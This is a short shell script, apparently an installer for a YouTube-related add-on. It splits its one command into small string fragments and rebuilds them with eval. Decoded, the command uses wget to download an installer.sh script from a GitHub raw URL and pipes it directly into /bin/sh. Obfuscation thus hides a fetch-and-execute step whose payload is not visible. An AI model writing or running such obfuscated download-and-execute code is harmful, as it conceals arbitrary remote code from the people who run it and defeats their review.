z="
";Sz=' -qO';Lz='37/Y';Oz='ain/';Nz='be/m';Fz='hubu';Pz='inst';Kz='mil2';Gz='serc';Tz=' - |';Ez='.git';Rz='r.sh';Uz=' /bi';Vz='n/sh';Cz='ps:/';Jz='om/e';Mz='ouTu';Dz='/raw';Hz='onte';Bz=' htt';Az='wget';Iz='nt.c';Qz='alle';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"